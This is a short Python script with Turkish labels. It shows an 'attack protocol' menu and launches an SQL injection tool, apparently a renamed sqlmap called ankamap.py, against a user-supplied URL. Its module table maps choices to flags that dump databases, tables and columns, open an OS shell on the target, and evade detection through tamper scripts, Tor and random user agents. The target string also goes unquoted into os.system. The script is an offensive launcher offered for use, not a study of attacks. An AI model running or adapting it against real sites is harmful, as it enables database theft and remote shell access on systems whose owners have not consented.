import os
import random
import time

def draw_glitch_guide():
    """Menüyü bozmayan, yanıp sönen HUD rehber kutusu"""
    R = '\033[0;31m'; G = '\033[0;32m'; Y = '\033[0;33m'; C = '\033[0;36m'; W = '\033[0m'
    color = random.choice([R, G, Y, C])
    glitch = random.choice(["!", "@", "#", "$", "%", "⚔️"])
    
    print(f"  {color}╔══════════ {glitch} SALDIRI PROTOKOLÜ {glitch} ══════════╗{W}")
    print(f"  {color}║{W}  1. Modül No Seç (01-50 arası)           {color}║{W}")
    print(f"  {color}║{W}  2. Hedef URL'yi eksiksiz gir            {color}║{W}")
    print(f"  {color}║{W}  3. ankamap.py mermi gibi ateşlenir      {color}║{W}")
    print(f"  {color}╚══════════════════════════════════════════╝{W}")

def fire_ankamap(mod_id, target):
    """Seçilen modülü doğrudan ankamap.py'ye fırlatır"""
    params = {
        "01": "--dbs", "02": "--tables", "03": "--columns", "04": "--dump",
        "11": "--tamper=space2comment --level=3",
        "21": "--os-shell", "41": "--tor"
    }
    sql_param = params.get(mod_id, "--dbs")
    
    os.system('clear')
    print(f"\033[0;31m[!] TAARRUZ BAŞLATILDI: ankamap.py -u {target} {sql_param}\033[0m\n")
    # Dosya isminin ankamap.py olduğundan emin olduk
    os.system(f"python3 ankamap.py -u {target} --batch --random-agent {sql_param}")
    input("\n\033[0;32m[+] Operasyon Tamam. Dönmek için ENTER...\033[0m")
